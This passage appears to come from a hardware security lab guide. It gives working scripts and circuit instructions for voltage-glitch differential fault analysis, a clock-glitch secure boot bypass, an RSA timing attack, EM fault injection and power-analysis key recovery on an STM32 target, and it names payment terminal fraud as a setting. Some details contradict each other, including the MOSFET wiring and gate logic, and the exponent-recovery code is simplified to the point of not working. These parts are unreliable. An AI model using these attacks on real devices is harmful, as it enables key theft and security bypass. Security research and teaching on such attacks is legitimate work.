If the target crashes or resets unexpectedly during cryptographic operations, configure the system to generate a core dump capturing memory state at the fault moment. For embedded systems without filesystem-based core dump support, modify the firmware to write memory contents to UART upon hard fault exception. Implement a hard fault handler that serializes SRAM contents:

```c
void HardFault_Handler(void) {
    // Disable interrupts to prevent reentrancy
    __disable_irq();
    
    // UART already initialized during boot
    uart_send_string("\n\n*** HARD FAULT ***\n");
    uart_send_string("SRAM Dump:\n");
    
    uint8_t *sram_start = (uint8_t *)0x20000000;
    uint32_t sram_size = 128 * 1024;  // 128 KB for STM32F407
    
    for (uint32_t i = 0; i < sram_size; i++) {
        if (i % 16 == 0) {
            char addr_str[16];
            snprintf(addr_str, sizeof(addr_str), "\n%08X: ", 
                     (unsigned int)(0x20000000 + i));
            uart_send_string(addr_str);
        }
        char byte_str[4];
        snprintf(byte_str, sizeof(byte_str), "%02X ", sram_start[i]);
        uart_send_string(byte_str);
    }
    
    uart_send_string("\n*** END DUMP ***\n");
    
    // Halt execution
    while(1);
}
```

Compile with hard fault handler enabled and provoke a fault during encryption by intentionally corrupting stack pointers or accessing invalid memory. Capture the UART output with minicom's logging feature (Ctrl-A, L, specify log filename) and parse the hexadecimal memory dump. Search the dump for AES key schedules (expanded keys showing round key derivation patterns) or RSA private key components (large prime factors, CRT parameters).

## Exercise 3: Fault Simulation & Exploit Verification

### Objective and Advanced Threat Context

This exercise introduces active perturbation techniques that induce controlled faults in cryptographic implementations to recover secret keys or bypass security checks. The adversary model assumes physical access with the capability to manipulate power supply voltage, inject clock glitches, and emit electromagnetic pulses to disrupt computation. This represents advanced hardware attacks employed in high-value exploitation scenarios including payment terminal fraud, secure enclave bypass, and digital rights management circumvention.

The technical objectives are threefold: first, to corrupt AES encryption operations via voltage glitching and recover the key through differential fault analysis (DFA); second, to bypass secure boot authentication by skipping signature verification through clock glitching; third, to demonstrate side-channel timing attacks against RSA implementations with variable-time modular exponentiation. Successful completion yields extracted cryptographic keys and proof-of-concept exploits demonstrating security control bypass.

### Voltage Glitching: AES Key Recovery via DFA

Differential fault analysis exploits the mathematical relationship between correct and faulty ciphertext pairs to algebraically recover secret keys. For AES, inducing a single-byte fault in the ninth round produces a ciphertext pair (correct and faulted) that leaks information about the final round key through differential equations. Collecting approximately 50-200 fault pairs enables full 128-bit key recovery through automated analysis tools.

Construct a voltage glitching apparatus using a bench power supply, a fast MOSFET switch, and a microcontroller-based trigger generator. The STM32F407 target operates at 3.3V nominal; introduce glitches by momentarily dropping supply voltage to 2.5V for 50-500 nanoseconds during the ninth AES round. This voltage drop causes timing violations in critical path logic, inducing computational errors in the SubBytes or MixColumns transformations while preserving enough stability for the microcontroller to complete the encryption and output (faulty) ciphertext.

Wire the glitching circuit in series with the target's power rail. Connect the bench supply positive terminal to the MOSFET drain, the MOSFET source to the target VDD, and the MOSFET gate to a PWM output from an Arduino or STM32 Nucleo board serving as the glitch controller. Configure the MOSFET as a low-side switch using an N-channel device (IRLZ44N or similar logic-level FET) with gate driven by 3.3V logic. The MOSFET's RDS(on) of < 50 milliohms ensures minimal voltage drop during normal operation.

Implement the glitch trigger on the controller board to synchronize with the target's encryption operation. Monitor the target's UART TX line with a GPIO input on the controller and detect the start bit of ciphertext transmission. Upon detecting the start bit, introduce a delay corresponding to the ninth AES round timing (approximately 80-90% through the total encryption duration measured earlier with the oscilloscope). Generate a 100-nanosecond glitch pulse by toggling the MOSFET gate: set GPIO high (turns off MOSFET, dropping target voltage), wait 100 ns, set GPIO low (restores voltage).

Calibrate glitch timing by iterating through delay values in 10-microsecond increments. For each delay, trigger 100 encryption operations and compare the output ciphertext against the known correct value (precompute by encrypting the plaintext with the known key in software). When the glitch hits the ninth round, approximately 1-5% of operations produce faulty but non-zero ciphertext (faults during earlier rounds typically cause the microcontroller to crash or output all zeros).

Collect fault pairs by running the glitched encryption repeatedly. Store tuples of (plaintext, correct_ciphertext, faulted_ciphertext) for each successful fault. Automate collection with a Python script that controls the glitch controller via serial commands and captures ciphertext from the target:

```python
#!/usr/bin/env python3
import serial
import time
import struct

def trigger_glitch(controller_port, delay_us):
    """Send glitch trigger command to controller."""
    controller = serial.Serial(controller_port, 115200, timeout=1)
    cmd = f"GLITCH {delay_us}\n".encode('ascii')
    controller.write(cmd)
    controller.close()

def capture_ciphertext(target_port):
    """Receive ciphertext from target UART."""
    target = serial.Serial(target_port, 115200, timeout=2)
    # Target sends ciphertext as 16 hex bytes followed by newline
    line = target.readline().decode('ascii').strip()
    target.close()
    if len(line) == 32:  # 16 bytes = 32 hex characters
        return bytes.fromhex(line)
    return None

def collect_fault_pairs(glitch_delay, num_attempts=100):
    """Collect fault pairs at specified glitch delay."""
    plaintext = bytes(range(16))  # Fixed plaintext for consistency
    correct_ciphertext = bytes.fromhex('known_correct_ciphertext_here')
    
    fault_pairs = []
    
    for attempt in range(num_attempts):
        trigger_glitch('/dev/ttyUSB0', glitch_delay)
        time.sleep(0.1)  # Wait for encryption to complete
        
        faulted = capture_ciphertext('/dev/ttyUSB1')
        if faulted and faulted != correct_ciphertext and faulted != b'\x00' * 16:
            fault_pairs.append({
                'plaintext': plaintext.hex(),
                'correct': correct_ciphertext.hex(),
                'faulted': faulted.hex()
            })
            print(f"Attempt {attempt}: Collected fault pair (total: {len(fault_pairs)})")
    
    return fault_pairs

if __name__ == "__main__":
    print("Calibrating glitch timing...")
    # Sweep through delays to find optimal timing
    best_delay = None
    max_faults = 0
    
    for delay in range(1000, 1500, 10):  # 1000-1500 microseconds in 10 us steps
        faults = collect_fault_pairs(delay, num_attempts=20)
        if len(faults) > max_faults:
            max_faults = len(faults)
            best_delay = delay
        print(f"Delay {delay} us: {len(faults)} faults")
    
    print(f"\nOptimal delay: {best_delay} us ({max_faults} faults in 20 attempts)")
    print("Collecting full fault pair dataset...")
    
    fault_pairs = collect_fault_pairs(best_delay, num_attempts=200)
    
    # Save fault pairs for DFA analysis
    import json
    with open('fault_pairs.json', 'w') as f:
        json.dump(fault_pairs, f, indent=2)
    
    print(f"Collected {len(fault_pairs)} fault pairs, saved to fault_pairs.json")
```

Run the script with `python3 collect_faults.py` and monitor the collection progress. The script automatically calibrates glitch timing by searching for the delay value that maximizes fault injection success rate, then collects 200 fault pairs at the optimal delay.

Analyze the collected fault pairs using a DFA tool. Several open-source implementations exist, including phoenixAES and JeanGrey. Install phoenixAES with `pip3 install phoenixAES` and run the analysis:

```python
#!/usr/bin/env python3
import json
from phoenixAES import crack_file

# Load collected fault pairs
with open('fault_pairs.json', 'r') as f:
    pairs = json.load(f)

# phoenixAES expects a specific input format: text file with lines of
# plaintext (hex) : correct ciphertext (hex) : faulted ciphertext (hex)
with open('faults_for_analysis.txt', 'w') as f:
    for pair in pairs:
        f.write(f"{pair['plaintext']}:{pair['correct']}:{pair['faulted']}\n")

# Run DFA to recover the key
print("Running differential fault analysis...")
recovered_keys = crack_file('faults_for_analysis.txt', verbose=True)

if recovered_keys:
    print(f"\nRecovered AES key candidates:")
    for key in recovered_keys:
        print(f"  {key.hex()}")
else:
    print("DFA failed to recover key. Collect more fault pairs.")
```

The DFA algorithm solves systems of differential equations derived from the AES state transition relationships. Each fault pair contributes constraints that reduce the key space. With sufficient fault pairs (typically 50-150 depending on fault model accuracy), the analysis converges to the correct 128-bit key. Verify recovered keys by encrypting the test plaintext with each candidate key and comparing against the known correct ciphertext.

If DFA fails to recover the key, troubleshoot by examining fault pair characteristics. Compute Hamming distances between correct and faulted ciphertexts; single-byte faults in round 9 produce Hamming distances of 20-50 bits (approximately 4 affected output bytes due to MixColumns diffusion). Multi-byte faults or faults in earlier rounds produce larger Hamming distances or cause algorithm crashes. Filter the fault pair dataset to retain only single-byte faults before rerunning DFA.

### Clock Glitching: Secure Boot Bypass

Clock glitching manipulates the target's instruction execution by injecting spurious clock edges that cause the CPU to skip instructions or misexecute conditional branches. This technique bypasses secure boot signature verification by forcing the branch instruction following signature check to jump to the success path regardless of the verification result.

The target firmware implements secure boot by loading a secondary bootloader from flash, verifying its RSA-2048 signature, and jumping to it only if verification succeeds. The verification code follows a standard pattern:

```c
bool verify_signature(uint8_t *firmware, uint32_t length, uint8_t *signature) {
    // Compute SHA-256 hash of firmware
    uint8_t hash[32];
    sha256(firmware, length, hash);
    
    // Verify RSA signature using public key
    return rsa_verify(public_key, hash, 32, signature, 256);
}

void secure_boot(void) {
    uint8_t *bootloader = (uint8_t *)0x08010000;
    uint32_t bootloader_size = 64 * 1024;
    uint8_t *signature = (uint8_t *)0x08020000;
    
    bool valid = verify_signature(bootloader, bootloader_size, signature);
    
    if (valid) {
        jump_to_bootloader(0x08010000);
    } else {
        halt_with_error("Signature verification failed");
    }
}
```

Disassemble the compiled firmware to locate the conditional branch instruction following the signature verification call. The ARM Cortex-M instruction sequence typically appears as:

```assembly
bl    verify_signature      ; Call verification function
cbnz  r0, boot_valid         ; If return value (r0) != 0, branch to boot_valid
b     boot_error             ; Otherwise, branch to error handler
boot_valid:
bl    jump_to_bootloader
```

The `cbnz` (compare and branch if non-zero) instruction reads the verification result from register R0 and conditionally branches. Glitching during the `cbnz` execution causes the CPU to skip or misinterpret the instruction, falling through to `boot_valid` regardless of R0's value.

Construct a clock glitching circuit by intercepting the target's external crystal oscillator signal. Most microcontrollers use an external 8 MHz crystal with internal PLL to generate the CPU clock (168 MHz for STM32F407). Inject glitches at the crystal oscillator input (OSC_IN pin) by momentarily driving it with a GPIO from the glitch controller, overriding the crystal's natural oscillation.

Solder a thin wire to the OSC_IN pin (requires microscope and steady hand; the pin is typically 0.5 mm pitch on LQFP packages). Connect this wire to a buffer circuit consisting of a 74HC04 inverter gate with tri-state output controlled by the glitch controller. During normal operation, the buffer is in high-impedance mode, allowing the crystal to drive OSC_IN. During the glitch, the buffer outputs a single spurious pulse, injecting an extra clock edge.

Trigger the glitch at the precise moment the CPU executes the `cbnz` instruction. Use the UART console output as a coarse timing reference; the target prints "Verifying signature..." before calling `verify_signature`. Measure the time from this message to the expected `cbnz` execution using the oscilloscope trigger method described earlier. Implement fine timing adjustment with a delay loop on the glitch controller, iterating through nanosecond-scale offsets.

Automate glitch timing exploration with a script that sweeps through delay offsets and monitors the target's behavior:

```python
#!/usr/bin/env python3
import serial
import time

def reset_target(controller_port):
    """Assert target reset pin via controller GPIO."""
    controller = serial.Serial(controller_port, 115200, timeout=1)
    controller.write(b"RESET\n")
    time.sleep(0.5)
    controller.close()

def trigger_clock_glitch(controller_port, delay_ns, pulse_width_ns=50):
    """Inject clock glitch at specified delay."""
    controller = serial.Serial(controller_port, 115200, timeout=1)
    cmd = f"CLOCK_GLITCH {delay_ns} {pulse_width_ns}\n".encode('ascii')
    controller.write(cmd)
    controller.close()

def monitor_boot_result(target_port, timeout=5):
    """Capture boot sequence output and determine success/failure."""
    target = serial.Serial(target_port, 115200, timeout=timeout)
    output = b""
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        if target.in_waiting:
            output += target.read(target.in_waiting)
    
    target.close()
    
    # Check for bootloader success messages
    if b"Bootloader started" in output or b"Secondary boot" in output:
        return "SUCCESS"
    elif b"Signature verification failed" in output:
        return "FAIL"
    elif b"Hard fault" in output or len(output) == 0:
        return "CRASH"
    else:
        return "UNKNOWN"

def explore_glitch_window():
    """Sweep through timing offsets to find successful glitch parameters."""
    base_delay = 3500000  # 3.5 ms from "Verifying signature..." message
    
    results = {}
    
    for offset in range(-50000, 50000, 500):  # ±50 us around base, 500 ns steps
        delay = base_delay + offset
        
        reset_target('/dev/ttyUSB0')
        time.sleep(0.2)
        trigger_clock_glitch('/dev/ttyUSB0', delay)
        
        result = monitor_boot_result('/dev/ttyUSB1')
        results[delay] = result
        
        status_char = {'SUCCESS': '✓', 'FAIL': '✗', 'CRASH': '!', 'UNKNOWN': '?'}
        print(f"Delay {delay:8d} ns: {status_char[result]}", end=' ', flush=True)
        if (offset + 50000) % 10000 == 0:
            print()  # Newline every 20 attempts
        
        if result == "SUCCESS":
            print(f"\n*** BYPASS SUCCESS at delay {delay} ns ***")
    
    # Summarize results
    print("\n\nSummary:")
    success_delays = [d for d, r in results.items() if r == "SUCCESS"]
    if success_delays:
        print(f"Successful glitch delays: {success_delays}")
        print(f"Glitch window: {min(success_delays)} - {max(success_delays)} ns")
    else:
        print("No successful bypasses found. Adjust base delay or glitch parameters.")

if __name__ == "__main__":
    print("Clock glitch secure boot bypass exploration")
    print("Searching for timing window...\n")
    explore_glitch_window()
```

Execute the script and monitor the output. Successful bypass appears when the target boots into the secondary bootloader despite an invalid signature. The script identifies the timing window (range of delays that produce successful bypass) and optimal parameters. Clock glitching typically requires sub-microsecond timing precision; success rates vary from 1-30% depending on the target's clock frequency, voltage, and temperature.

Document the successful glitch parameters and verify repeatability. Reset the target multiple times and apply the glitch at the identified delay, confirming consistent bypass behavior. If the success rate is low (< 10%), refine the glitch pulse width or try injecting multiple pulses in rapid succession to increase the probability of hitting the vulnerable instruction.

### Timing Side-Channel Attack: RSA Key Recovery

Timing side-channel attacks exploit variable-time cryptographic implementations where execution duration depends on secret key bits. Textbook RSA implementations using square-and-multiply exponentiation leak the private exponent through timing variations: squaring operations occur for every exponent bit, while multiply operations occur only for 1-bits. Measuring thousands of decryption operation timings reveals the private key bit pattern through statistical analysis.

Prepare a target firmware that performs RSA-1024 decryption using a naive square-and-multiply implementation:

```c
// Insecure RSA decryption with timing side-channel
void rsa_decrypt(uint8_t *ciphertext, uint8_t *plaintext, uint8_t *private_key, uint16_t key_bits) {
    bigint_t c, m, d, n;
    
    bigint_from_bytes(&c, ciphertext, key_bits / 8);
    bigint_from_bytes(&d, private_key, key_bits / 8);
    bigint_from_bytes(&n, modulus, key_bits / 8);
    
    bigint_set_one(&m);
    
    for (int i = key_bits - 1; i >= 0; i--) {
        bigint_square(&m, &m, &n);
        if (bigint_bit(&d, i)) {
            bigint_multiply(&m, &m, &c, &n);
        }
    }
    
    bigint_to_bytes(&m, plaintext, key_bits / 8);
}
```

The conditional multiply operation introduces a timing difference of approximately 1-5 microseconds per 1-bit (depending on the bigint multiplication implementation speed). Over a 1024-bit exponent, these differences accumulate to 1-5 milliseconds total variation between decryption operations on different ciphertexts.

Configure the target to accept ciphertext via UART, perform decryption, and return the plaintext. Instrument the timing measurement on the attack workstation using high-resolution timestamps. Send a sequence of chosen ciphertexts and record decryption duration for each:

```python
#!/usr/bin/env python3
import serial
import time
import struct
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher

def measure_decryption_time(target_port, ciphertext):
    """Send ciphertext and measure decryption duration."""
    target = serial.Serial(target_port, 115200, timeout=10)
    
    # Send ciphertext (128 bytes for RSA-1024)
    target.write(ciphertext)
    
    start = time.perf_counter()
    
    # Wait for plaintext response
    plaintext = target.read(128)
    
    end = time.perf_counter()
    
    target.close()
    
    return (end - start), plaintext

def timing_attack_rsa(num_samples=10000):
    """Perform timing attack to recover RSA private exponent."""
    # Generate random ciphertexts (in practice, use chosen plaintexts)
    import os
    
    timings = []
    
    for i in range(num_samples):
        ciphertext = os.urandom(128)
        
        duration, plaintext = measure_decryption_time('/dev/ttyUSB1', ciphertext)
        timings.append((ciphertext.hex(), duration))
        
        if i % 100 == 0:
            print(f"Collected {i}/{num_samples} samples, last duration: {duration*1e6:.1f} us")
    
    # Analyze timing distribution
    durations = [t[1] for t in timings]
    import statistics
    mean = statistics.mean(durations)
    stdev = statistics.stdev(durations)
    
    print(f"\nTiming statistics:")
    print(f"  Mean: {mean*1e6:.1f} us")
    print(f"  StdDev: {stdev*1e6:.1f} us")
    print(f"  Range: {min(durations)*1e6:.1f} - {max(durations)*1e6:.1f} us")
    
    # Partition ciphertexts by timing
    fast_ciphertexts = [c for c, t in timings if t < mean - 0.5*stdev]
    slow_ciphertexts = [c for c, t in timings if t > mean + 0.5*stdev]
    
    print(f"\nFast decryptions: {len(fast_ciphertexts)}")
    print(f"Slow decryptions: {len(slow_ciphertexts)}")
    
    # Further analysis requires correlating timing with private exponent bits
    # Use Kocher's timing attack algorithm or lattice-based approaches
    
    return timings

if __name__ == "__main__":
    print("RSA timing side-channel attack")
    print("Collecting decryption timings...\n")
    
    timings = timing_attack_rsa(num_samples=5000)
    
    # Save for offline analysis
    import json
    with open('rsa_timings.json', 'w') as f:
        json.dump([{'ciphertext': c, 'duration': t} for c, t in timings], f, indent=2)
    
    print("\nTimings saved to rsa_timings.json")
```

Run the timing collection script and observe the distribution of decryption durations. A vulnerable implementation exhibits a standard deviation of 0.5-5% of the mean duration, indicating measurable timing variation. If the standard deviation is negligible (< 0.1%), the implementation likely uses constant-time techniques (Montgomery ladder, blinding) that resist timing attacks.

Recover the private exponent by applying Kocher's binary search algorithm. For each bit position in the exponent (starting from the most significant), partition the collected timing samples into two sets based on a timing threshold. Hypothesize that the current bit is 0 or 1, simulate the remaining bits, and check which hypothesis better explains the observed timing distribution. The hypothesis with lower variance is likely correct. Iterate through all bit positions to reconstruct the full exponent.

Implement the bit recovery algorithm:

```python
#!/usr/bin/env python3
import json
import statistics
import math

def recover_exponent_bit(timings, bit_position, known_prefix):
    """
    Recover a single exponent bit using timing correlation.
    
    Args:
        timings: List of (ciphertext, duration) tuples
        bit_position: Current bit position (0 = LSB)
        known_prefix: Already recovered higher bits
    
    Returns:
        Recovered bit value (0 or 1)
    """
    # Partition timings by hypothesized bit value
    hypothesis_0 = []
    hypothesis_1 = []
    
    for ciphertext_hex, duration in timings:
        # Estimate expected timing based on known prefix and hypothesis
        # This is simplified; real implementation requires full modular arithmetic
        
        bit_count = bin(known_prefix).count('1')
        
        # Hypothesis: bit is 0 (no multiply at this position)
        expected_0 = base_time + bit_count * multiply_time
        diff_0 = abs(duration - expected_0)
        hypothesis_0.append(diff_0)
        
        # Hypothesis: bit is 1 (multiply at this position)
        expected_1 = base_time + (bit_count + 1) * multiply_time
        diff_1 = abs(duration - expected_1)
        hypothesis_1.append(diff_1)
    
    # Choose hypothesis with lower variance (better fit)
    var_0 = statistics.variance(hypothesis_0)
    var_1 = statistics.variance(hypothesis_1)
    
    return 0 if var_0 < var_1 else 1

# Load collected timings
with open('rsa_timings.json', 'r') as f:
    timings = json.load(f)
    timings = [(t['ciphertext'], t['duration']) for t in timings]

# Estimate timing parameters from distribution
durations = [t[1] for t in timings]
mean_duration = statistics.mean(durations)
stdev_duration = statistics.stdev(durations)

# Rough estimates (calibrate from known operations)
base_time = min(durations)  # Time for all-zero exponent (1024 squares)
multiply_time = stdev_duration / math.sqrt(1024)  # Per-bit multiply overhead

print("Recovering private exponent bits...")
recovered_exponent = 0

for bit_pos in range(1024, -1, -1):  # MSB to LSB
    bit_value = recover_exponent_bit(timings, bit_pos, recovered_exponent)
    recovered_exponent = (recovered_exponent << 1) | bit_value
    
    if bit_pos % 64 == 0:
        print(f"Bit {bit_pos:4d}: {bit_value} (partial exponent: 0x{recovered_exponent:X})")

print(f"\nRecovered private exponent:")
print(f"  Hex: 0x{recovered_exponent:X}")
print(f"  Bits: {bin(recovered_exponent)}")
```

The algorithm iteratively reconstructs the private exponent from most significant to least significant bit by testing which bit value better explains the observed timing distribution. With sufficient timing samples (5000-10000) and accurate timing measurements (microsecond precision), the attack recovers the complete 1024-bit private exponent.

Verify the recovered exponent by using it to decrypt a test ciphertext and comparing against the known plaintext. If the recovered exponent is incorrect, increase the number of timing samples or improve measurement precision by using hardware timestamps (e.g., ARM Cortex-M's DWT cycle counter accessed via JTAG).

### Electromagnetic Fault Injection

Electromagnetic injection (EMI) induces faults by radiating high-power transient electromagnetic pulses near the target chip. The pulses couple into bond wires and PCB traces, inducing voltage spikes that flip bits in register file or SRAM. EMI requires less precise positioning than voltage or clock glitching and can target specific chip regions by adjusting the probe position.

Construct an EMI probe using a small coil (10-20 turns of 0.3 mm magnet wire wound around a 3 mm diameter ferrite rod) connected to a high-voltage pulse generator. Use a MOSFET-switched capacitor discharge circuit: charge a 100 nF capacitor to 100-300V, then discharge through the coil via a fast MOSFET (IXDN630 or similar driver). The resulting current pulse generates a magnetic field strength of 1-10 kA/m at the probe tip.

Position the EMI probe approximately 1-5 mm above the target chip package, directly over the CPU die area. Secure the probe with a micromanipulator or adhesive mount to maintain consistent positioning. Connect the oscilloscope probe to monitor the current pulse through the coil by measuring voltage across a 1-ohm sense resistor in series.

Trigger the EMI pulse during cryptographic operations using the same timing techniques as voltage glitching. Sweep through probe positions and pulse timings to identify vulnerable chip regions and algorithm phases. Successful fault injection produces similar effects to voltage glitching (corrupted ciphertext, skipped instructions) but requires experimentation to optimize pulse amplitude, duration, and probe positioning.

Safety warning: EMI equipment generates high voltage and strong magnetic fields. Ensure proper insulation of all high-voltage connections, discharge capacitors before handling circuits, and avoid positioning the probe near ferromagnetic objects that could be magnetically launched.

### Side-Channel Analysis: Correlation Power Analysis

Correlation power analysis (CPA) recovers cryptographic keys by correlating measured power consumption with hypothetical intermediate values computed for all possible key guesses. Unlike timing attacks that require thousands of samples, CPA can succeed with as few as 100-1000 power traces.

Capture power traces during AES encryption using the oscilloscope setup from Exercise 1. Collect 1000 traces, each corresponding to encryption of a different random plaintext. For each trace, record the plaintext and the full power waveform (50,000-100,000 samples at 100 MS/s covering the complete encryption duration).

Implement the CPA attack by hypothesizing each possible byte value for one key byte (256 possibilities). For each hypothesis and each power trace:

1. Compute the hypothetical intermediate value after the first SubBytes operation: `S-box[plaintext_byte XOR key_hypothesis]`
2. Compute the Hamming weight of the intermediate value (number of 1-bits)
3. Correlate the Hamming weight time series across all traces with the power consumption time series

The correct key hypothesis produces the highest correlation coefficient because the Hamming weight accurately predicts actual power consumption. Repeat this process for all 16 key bytes independently.

Implement the CPA attack in Python:

```python
#!/usr/bin/env python3
import numpy as np
from scipy import stats

# AES S-box
SBOX = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    # ... (complete 256-byte S-box)
]

def hamming_weight(byte_val):
    """Count number of 1-bits in a byte."""
    return bin(byte_val).count('1')

def load_power_traces(filename):
    """Load power traces from CSV file."""
    data = np.loadtxt(filename, delimiter=',')
    plaintexts = data[:, 0:16].astype(int)  # First 16 columns
    traces = data[:, 16:]  # Remaining columns are power samples
    return plaintexts, traces

def cpa_attack_byte(plaintexts, traces, byte_index):
    """Recover one AES key byte using CPA."""
    num_traces = len(plaintexts)
    num_samples = traces.shape[1]
    
    correlations = np.zeros((256, num_samples))
    
    for key_guess in range(256):
        # Compute hypothetical intermediate values
        hypothetical = np.array([
            hamming_weight(SBOX[plaintexts[i, byte_index] ^ key_guess])
            for i in range(num_traces)
        ])
        
        # Correlate with each power sample
        for sample in range(num_samples):
            power_column = traces[:, sample]
            correlation = stats.pearsonr(hypothetical, power_column)[0]
            correlations[key_guess, sample] = abs(correlation)
    
    # Find key guess with maximum correlation across all samples
    max_correlations = np.max(correlations, axis=1)
    best_key = np.argmax(max_correlations)
    best_corr = max_correlations[best_key]
    
    return best_key, best_corr

def recover_aes_key(plaintexts, traces):
    """Recover full 16-byte AES key."""
    recovered_key = bytearray(16)
    
    for byte_idx in range(16):
        key_byte, correlation = cpa_attack_byte(plaintexts, traces, byte_idx)
        recovered_key[byte_idx] = key_byte
        print(f"Byte {byte_idx:2d}: 0x{key_byte:02X} (correlation: {correlation:.4f})")
    
    return bytes(recovered_key)

if __name__ == "__main__":
    print("Correlation Power Analysis attack on AES")
    print("Loading power traces...")
    
    plaintexts, traces = load_power_traces('aes_power_traces.csv')
    print(f"Loaded {len(plaintexts)} traces with {traces.shape[1]} samples each")
    
    print("\nRecovering AES key bytes:")
    key = recover_aes_key(plaintexts, traces)
    
    print(f"\nRecovered AES key: {key.hex()}")
```

Format the power traces as CSV with each row containing: 16 plaintext bytes (comma-separated) followed by all power samples for that encryption operation. Run the CPA script to recover the key. Successful attacks typically show correlation coefficients above 0.5 for the correct key byte and below 0.2 for incorrect guesses.

If CPA fails to recover the key, verify that power traces are properly aligned (all traces must start at the same algorithmic point, typically the first SubBytes operation). Re-trigger trace capture using a more precise synchronization signal, such as a GPIO toggle immediately before the encryption function call. Increase the number of traces to 5000-10000 if the target includes noise sources or countermeasures like random delays.

## Hardware Security Checklist & Diagnostic Cheat Sheet

### Pre-Engagement Reconnaissance Checklist

Before commencing invasive testing, document the target's baseline operational characteristics:

- [ ] Identify target microcontroller/SoC model and architecture (ARM, MIPS, RISC-V, x86)
- [ ] Locate and photograph all debug interfaces (JTAG, SWD, UART headers)
- [ ] Measure nominal operating voltage and current consumption with multimeter
- [ ] Record boot sequence messages via UART console at multiple baud rates
- [ ] Attempt OpenOCD connection with standard configuration files for the identified chip
- [ ] Extract SPI flash chip model and capacity from PCB silkscreen or die marking
- [ ] Verify read-out protection status with flashrom or OpenOCD
- [ ] Document PCB layer count and identify power/ground planes with continuity testing
- [ ] Photograph chip markings under magnification (10-50x) to confirm part numbers

### Signal Integrity Verification Commands

Validate instrumentation before attributing anomalies to cryptographic vulnerabilities:

```bash
# Logic analyzer self-test with known signal source
sigrok-cli -d fx2lafw --config samplerate=24MHz --samples 100k \
  --channels 0-7 --triggers 0=f --output-file selftest.sr

# Verify UART framing and baud rate
minicom -D /dev/ttyUSB0 -b 115200
# Press Ctrl-A, Z, O to configure; disable hardware flow control

# Measure actual UART bit timing with logic analyzer
sigrok-cli -d fx2lafw --config samplerate=100MHz --samples 1M \
  --channels 0 --triggers 0=f -P uart:baudrate=115200:rx=0 > uart_decode.txt

# Test JTAG connection and read device ID
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg \
  -c "init; targets; mdw 0xE000ED00 1; exit"

# Verify SPI flash programmer connectivity
flashrom -p ft2232_spi:type=232H -V
```

### Memory Dumping Quick Reference

```bash
# Dump complete SRAM via OpenOCD telnet interface
echo "halt; dump_image sram.bin 0x20000000 0x20000; resume; exit" | \
  nc localhost 4444

# Extract firmware from SPI flash
flashrom -p ft2232_spi:type=232H -r firmware_full.bin

# Read specific flash region (addresses depend on memory map)
flashrom -p ft2232_spi:type=232H -r bootloader.bin \
  --flash-name --ifd -i bios

# GDB memory dump of specific range
gdb-multiarch -ex "target extended-remote :3333" \
  -ex "dump binary memory key_region.bin 0x20001000 0x20001100" \
  -ex "quit"
```

### Firmware Analysis Triage Commands

```bash
# Identify firmware structure and extract embedded files
binwalk -e firmware.bin

# Search for cryptographic constants
python3 crypto_constants.py firmware.bin

# Disassemble at specific address (adjust for architecture)
r2 -a arm -b 32 -m 0x08000000 -c "s 0x080012f0; pdf" firmware.bin

# Extract strings with minimum length filter
strings -n 8 firmware.bin | grep -i "aes\|rsa\|ecdsa\|crypto"

# Generate entropy plot to identify encrypted/compressed regions
binwalk -E firmware.bin
```

### OpenOCD Diagnostic Snippets

```bash
# Read Cortex-M CPUID and system control registers
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg -c "\
  init; \
  halt; \
  mdw 0xE000ED00 1; \
  mdw 0xE000E008 1; \
  resume; \
  exit"

# Dump vector table (first 64 entries)
echo "halt; mdw 0x08000000 64; resume; exit" | nc localhost 4444

# Set breakpoint and single-step
# In GDB connected to OpenOCD:
(gdb) break *0x08001234
(gdb) continue
(gdb) stepi
(gdb) info registers
```

### Glitch Parameter Documentation Template

When successfully exploiting a fault injection vulnerability, record parameters for reproducibility:

```
Target: [STM32F407 / ESP32 / ...]
Firmware: [version, hash]
Attack: [Voltage glitch / Clock glitch / EMI]

Glitch Parameters:
  - Timing delay: [microseconds from trigger event]
  - Pulse width: [nanoseconds]
  - Voltage drop: [from nominal to glitched level]
  - Success rate: [successful faults / total attempts]

Trigger Method: [UART start bit / GPIO toggle / ...]
Observable Effect: [secure boot bypass / faulty ciphertext / ...]

Environmental Conditions:
  - Temperature: [°C]
  - Supply voltage: [V]
  - Clock frequency: [MHz]
```

### Troubleshooting Decision Tree

**Symptom: Logic analyzer shows no signal activity**
- Check probe ground continuity with multimeter
- Verify target is powered (measure VDD with voltmeter)
- Reduce sampling rate to 1 MHz and retry
- Confirm correct pin identification with datasheet

**Symptom: UART console shows garbage characters**
- Iterate through standard baud rates: 9600, 19200, 38400, 57600, 115200
- Measure actual bit timing with logic analyzer
- Verify 8N1 framing configuration (8 data bits, no parity, 1 stop bit)
- Check for inverted TX signal (idle should be high)

**Symptom: OpenOCD fails to detect target**
- Verify JTAG/SWD pin connections with multimeter continuity test
- Check that target is powered and clocked (measure XTAL with oscilloscope)
- Try lower JTAG clock speed: `adapter speed 100` in OpenOCD config
- Read target's JTAG IDCODE manually by toggling pins (advanced)

**Symptom: Flashrom reports "No EEPROM/flash device found"**
- Verify SPI wiring: swap MOSI/MISO if incorrect
- Check chip select (CS) is properly driven low during transactions
- Confirm flash chip is powered (3.3V on VCC pin)
- Try alternative programmer interface (e.g., switch from FT2232H to Raspberry Pi GPIO)

**Symptom: Power traces show excessive noise**
- Reduce oscilloscope bandwidth (enable 20 MHz filter)
- Increase current sense resistor value (10Ω → 47Ω)
- Verify ground clip on probe is short and connects to target ground plane
- Shield setup from nearby switching power supplies and RF sources

**Symptom: Fault injection produces crashes instead of exploitable faults**
- Glitch timing is too early (hitting critical setup code); increase delay
- Glitch pulse is too wide; reduce from 500ns to 50-100ns
- Voltage drop is too severe; reduce from 1.0V drop to 0.5V drop
- Target includes hardware watchdog; disable via JTAG before glitching

**Symptom: CPA attack shows no correlation peaks**
- Verify power traces are aligned (time zero must be consistent across traces)
- Increase number of traces to 5000-10000
- Check that plaintexts are varying (not all encrypting the same data)
- Target may implement constant-time code or shuffling countermeasures

